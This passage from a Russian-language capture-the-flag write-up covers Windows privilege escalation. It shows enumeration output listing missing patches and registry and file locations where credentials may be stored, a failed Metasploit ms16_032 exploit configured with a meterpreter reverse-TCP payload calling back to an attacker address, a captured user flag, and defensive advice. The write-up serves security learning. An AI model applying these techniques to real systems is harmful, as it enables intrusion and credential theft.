MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                                                              
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)                                                           
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)                                                        
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)                                             
MS04-020 patch is NOT installed 2K/SP4-POSIX)                                                                      
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                          
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                       
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                        
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                                                                    
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                      
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)                                                          
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
```

```ps
 [+] Files in registry that may contain credentials                                                                
   [i] Searching specific files that may contains credentials.                                                     
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                                                 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                  
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                          
    DefaultDomainName    REG_SZ                                                                                    
    DefaultUserName    REG_SZ                                                                                      
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                         
Looking inside HKCU\Software\TightVNC\Server                                                                       
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                            
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                    
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\places.sqlite                    
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db                          
C:\Windows\Panther\unattend.xml                                                                                    
C:\Windows\Panther\setupinfo                                                                                       
C:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7601.17514_none_6f0f7833cb71e18d\appcmd.exe                                                                                                        
C:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7601.17514_none_79642285ffd2a388\appcmd.exe
```

`ms16_032` не отработал
```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.21.104.16     yes       The listen address (an interface may be specified)
   LPORT     7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.21.104.16:7777 
[+] Compressed size: 1160
[-] Exploit aborted due to failure: not-vulnerable: Target is not vulnerable
[+] Deleted 
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > 

```

## 🏁 Флаги

- User flag: {H4lf_W4y_Th3r3} 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


